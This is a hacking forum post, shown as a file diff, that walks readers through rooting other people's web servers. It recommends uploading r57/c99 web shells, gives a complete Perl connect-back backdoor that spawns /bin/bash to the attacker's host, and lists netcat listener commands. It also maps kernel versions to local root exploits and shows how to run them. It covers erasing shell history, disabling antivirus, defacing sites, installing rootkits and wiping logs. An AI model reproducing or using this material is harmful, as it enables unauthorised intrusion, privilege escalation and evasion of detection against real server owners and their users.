@@ -1,0 +1,281 @@
+D0000D发往论坛板块-------------------------------------------------------
+No2  号板块  技术文章
+D8888D贴子标题-------------------------------------------------------
+how to root a box-web
+D8888D主贴内容-------------------------------------------------------
+Today, I have decided to put up a tutorial for both newbies and pwners! and just reference for all of us. This is a dream of every h4k3r, to get free root access. if you haven't got one, then try harder, because you are not a h4ck3r then.
+
+Hacking is not about dumping database using prescripted materials by another hacker, a good hacker does write his own script and use it to the maximum extent to achieve whatever his/her project was, and this is refers to as priv8 script.
+
+You have to get access to restricted access before you can say, I'm a h4xor or so!
+Today, I will give you brief tutorial on how to get your first root access!
+
+Ok enough.
+
+requirement:
+shell [url=http://unsecure-site.com/r57.php]链接标记http://unsecure-site.com/r57.php[/url]
+[url=http://unsecured-site.com/c99.php]链接标记http://unsecured-site.com/c99.php[/url]
+
+This mean you have downloaded shell on the site.
+
+You will need, swiss-army weapon (Don't travel to swiss yet, this is netcat) and it can be downloaded on internet free of charge
+
+you will also need a backconnect script. I provided one for your use here!
+
+so let's roll on.
+
+Shell Access on a website is the first thing you will need. 
+
+You can get this access, by doing uploading of shell to any vulnerable website using the following method:
+LFI = Local File Inclusion
+RFI = Remote File Inclusion
+SQL Injection
+
+I will not go to details on the above. I will post extensive tutorial on those later, but I think the forum must have some nice tuto on those, do some search. 
+
+NOW, get swiss knife weapon, AKA netcat
+
+[url=http://www.vulnwatch.org/netcat/nc111nt.zip]链接标记http://www.vulnwatch.org/netcat/nc111nt.zip[/url]
+
+If you have an antivirus that auto deletes infected files or virus i would suggest 
+disabling it as some av's will detect netcat as a hacktool or remote admin tool.
+it is not a virus.
+
+Downloaded? good on window box, double click it and it will bring up a command prompt, then type
+
+-vv -l -n -p <porttoconnecton>
+
+Now backconnet
+I preffer to use one thats not 
+in the shell because i find that those back connects work shitty so i will provide you 
+with one that i use. Very simple to use just save as "bc.pl" then upload to server and 
+end execute.
+
+Code:
+perl bc.pl <youriphere> <porttoconnecton>
+Code: PERL
+
+#!/usr/bin/perl
+use IO::Socket;
+# Priv8 ** Priv8 ** Priv8
+# s4t3ll1t3 SABOTAGE Connect Back Shell 
+# code by:s4t3ll1t3
+# We Are :s4t3ll1t3-C0d3r-NT-\x90 
+# Email:s4t3ll1t3@ihsteam.com
+#
+#s4t3ll1t3@SlackwareLinux:/home/programing$ perl dc.pl
+#--== ConnectBack Backdoor Shell vs 1.0 by s4t3ll1t3 of s4t3ll1t3 SABOTAGE ==--
+#
+#Usage: dc.pl [Host] [Port]
+#
+#Ex: dc.pl 127.0.0.1 2121
+#s4t3ll1t3@SlackwareLinux:/home/programing$ perl dc.pl 127.0.0.1 2121
+#--== ConnectBack Backdoor Shell vs 1.0 by s4t3ll1t3 of s4t3ll1t3 SABOTAGE ==--
+#
+#
+Resolving HostName
+#
+Connecting... 127.0.0.1
+#
+Spawning Shell
+#
+Connected to remote host
+
+#bash-2.05b# nc -vv -l -p 2121
+#listening on [any] 2121 ...
+#connect to [127.0.0.1] from localhost [127.0.0.1] 32769
+#--== ConnectBack Backdoor vs 1.0 by s4t3ll1t3 of s4t3ll1t3 SABOTAGE ==--
+#
+#--==Systeminfo==--
+#Linux SlackwareLinux 2.6.7 #1 SMP Thu Dec 23 00:05:39 IRT 2004 i686 unknown unknown 
+GNU/Linux
+#
+#--==Userinfo==--
+#uid=1001(lamer) gid=100(users) groups=100(users)
+#
+#--==Directory==--
+#/root
+#
+#--==Shell==--
+#
+$system = '/bin/bash';
+$ARGC=@ARGV;
+print "IHS BACK-CONNECT BACKDOOR\n\n";
+if ($ARGC!=2) {
+print "Usage: $0 [Host] [Port] \n\n";
+die "Ex: $0 127.0.0.1 2121 \n";
+}
+use Socket;
+use FileHandle;
+socket(SOCKET, PF_INET, SOCK_STREAM, getprotobyname('tcp')) or die print "[-] Unable to 
+Resolve Host\n";
+connect(SOCKET, sockaddr_in($ARGV[1], inet_aton($ARGV[0]))) or die print "[-] Unable to 
+Connect Host\n";
+print "
+Resolving HostName\n";
+print "
+Connecting... $ARGV[0] \n";
+print "
+Spawning Shell \n";
+print "
+Connected to remote host \n";
+SOCKET->autoflush();
+open(STDIN, ">&SOCKET");
+open(STDOUT,">&SOCKET");
+open(STDERR,">&SOCKET");
+print "IHS BACK-CONNECT BACKDOOR \n\n";
+system("unset HISTFILE; unset SAVEHIST;echo --==Systeminfo==--; uname -a;echo;
+echo --==Userinfo==--; id;echo;echo --==Directory==--; pwd;echo; echo --==Shell==-- ");
+system($system);
+#EOF
+
+copy the above to a file and name it bc.pl upload it to server, you are done.
+
+**Note that if you are running a router or wireless on multiple ips set by your dhcp you 
+might have to forward the <porttoconnecton> to what ever the ip of your computer is. You 
+can check this by opening command prompt and typing ipconfig you should get an ip that 
+looks similar to 192.168.1.100 which is the ip to forward to. If you are unsure about 
+how to forward your port check out this site and find your router model.
+
+[url=http://portforward.com/routers.htm]链接标记http://portforward.com/routers.htm[/url]
+
+Now back to netcat, type the following command.
+
+-vv -l -n -p 443 
+
+for this tutorial we will connect on port 4343. Hit enter and it 
+should start listening for a connection.
+
+remember you had downloaded bc.pl. on the server, now conncet it to you netcat with the following command
+perl bc.pl <yourip> 443
+
+Check your netcat, it should be connected
+giving you details info about the box.
+
+i like to do this first to know the kinda exploit u will use.
+uname -a;id
+Once executed you will see something probably similar to
+
+Code:
+Linux alexandra.adm24.de 2.6.8-2-686-smp #1 SMP Tue Aug 16 12:08:30 UTC 2005 i686 
+GNU/Linux
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+The important information here that you want is the OS & Kernel version which is 2.6.8-2 and you can see the last update of it was in 2005 so it's fairly old. which is a good thing for us.
+
+below here are kernel that can be rooted, just general ideal. i have a link to the kernels and their exploit, check it out
+
+[url=http://www.molotovbitch.org/localroot/]链接标记http://www.molotovbitch.org/localroot/[/url]
+
+Code:
+2.2 -> ptrace
+2.4.17 -> newlocal, kmod, uselib24
+2.4.18 -> brk, brk2, newlocal, kmod
+2.4.19 -> brk, brk2, newlocal, kmod
+2.4.20 -> ptrace, kmod, ptrace-kmod, brk, brk2
+2.4.21 -> brk, brk2, ptrace, ptrace-kmod
+2.4.22 -> brk, brk2, ptrace, ptrace-kmod
+2.4.22-10 -> loginx
+2.4.23 -> mremap_pte
+2.4.24 -> mremap_pte, uselib24
+2.4.25-1 -> uselib24
+2.4.27 -> uselib24
+2.6.2 -> mremap_pte, krad, h00lyshit
+2.6.5 -> krad, krad2, h00lyshit
+2.6.6 -> krad, krad2, h00lyshit
+2.6.7 -> krad, krad2, h00lyshit
+2.6.8 -> krad, krad2, h00lyshit
+2.6.8-5 -> krad2, h00lyshit
+2.6.9 -> krad, krad2, h00lyshit
+2.6.9-34 -> r00t, h00lyshit
+2.6.10 -> krad, krad2, h00lyshit
+2.6.13 -> raptor, raptor2, h0llyshit, prctl
+2.6.14 -> raptor, raptor2, h0llyshit, prctl
+2.6.15 -> raptor, raptor2, h0llyshit, prctl
+2.6.16 -> raptor, raptor2, h0llyshit, prctl
+2.6.23 - 2.6.24 -> diane_lane_******_hard.c
+2.6.17 - 2.6.24-1 -> jessica_biel_naked_in_my_bed.c
+
+you can get it there update version on this site.
+[url=http://www.molotovbitch.org/localroot/]链接标记http://www.molotovbitch.org/localroot/[/url]
+
+Once you have found the Kernel ver. of the server you are about to root you need to find 
+the Local Root Exploit for that kernel which you can find with google using the list 
+above. or just go here to make it easier!
+
+[url=http://www.molotovbitch.org/localroot/]链接标记http://www.molotovbitch.org/localroot/[/url] 
+
+Now check which exploit goes for which kernel, ok? you found it. good, before doing anything on this server, be as smart as possible, type this command
+
+unset HISTFILE ; unset HISTSIZE ; export HISTFILESIZE=0 ;
+this simply try to help your ass to to be traced by the histroy of your commands
+
+Now comply and root.
+
+To Compile your scripts go to 
+your shell that you have spawned with netcat and follow this instructions.
+
+Code:
+gcc xpl.c -o xpl
+This will compile your xpl.c to a file named xpl.
+
+From here now all you have to do is run your exploit which can be done by simply typing 
+in your netcat connection
+
+Code:
+./xpl
+
+It should execute the exploit file which you have just compiled and give you root
+
+then type 
+id; whoami
+
+it should say, root, your are root
+
+Congratulations! then remember me in your dream for posting this for your use.
+
+remember, all exploits are not just compile and execute, some requires some little works eg h0llyshit. it require a big file to work. 
+
+example of h00lyshit here
+
+before the compile)
+For the h00lyshit we must type:
+gcc h00lyshit.c -o h00lyshit
+then you get h00lyshit.
+The command to run this exploit is:
+./h00lyshit <very big file on the disk>
+We need a very big file on the disk in order to run successfully and to get root.
+We must create a big file in /tmp or into another writable folder.
+The command is:
+dd if=/dev/urandom of=largefile count=2M
+where largefile is the filename.
+please wait 2-3 minutes to get the file created!
+If this command fails we can try:
+dd if=/dev/zero of=/tmp/largefile count=102400 bs=1024
+Now we can procced to the last step. We can run the exploit by typing:
+./h00lyshit largefile or
+./h00lyshit /tmp/largefile
+(If we are in a different writable folder and the largefile is created in /tmp)
+If there are not running errors (maybe the kernel is patched or is something wrong with
+exploit run or large file) we will get root
+To check if we got root:
+id or
+whoami
+If it says root we got root!
+Now we can deface/mass deface all the sites of the server or to setup a rootkit (e.g.
+SSHDoor) and to take ssh/telnet shell access to the server.
+We must erase all logs in order to be safe with a log cleaner. A good cleaner for this
+job is the MIG Log Cleaner. clean your tracks, never leave them uncleaned!
+
+
+This tutorial is written by me, siteprojects
+for more hands on training you can join me on my irc at irc.unixreal.net #siteprojects
+
+I have provided some server for training.. so dont worry.
+
+written by siteprojects and credit should be given to those who deserve it. 
+
+You have permission to post in another forum like always, but do not forget to give credit.
+like I say, join irc.unixreal.net #siteprojects on details on how to get box rooted, LFI RFI SQL etc.
+
+N jooooooooooooooy
